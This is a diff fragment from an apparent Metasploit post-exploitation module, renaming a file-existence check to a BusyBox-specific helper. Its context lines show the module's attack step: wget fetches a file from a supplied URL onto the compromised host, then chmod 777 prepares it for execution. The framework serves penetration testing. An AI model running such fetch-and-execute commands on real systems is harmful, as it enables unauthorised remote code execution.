@@ -38,7 +38,7 @@ class Metasploit3 < Msf::Post
       cmd_exec("wget -O #{random_file_path} #{datastore['URL']}")
       Rex::sleep(0.1)
 
-      if file_exists(random_file_path)
+      if busy_box_file_exist?(random_file_path)
         print_good('File downloaded, executing...')
         cmd_exec("chmod 777 #{random_file_path}")
         Rex::sleep(0.1)
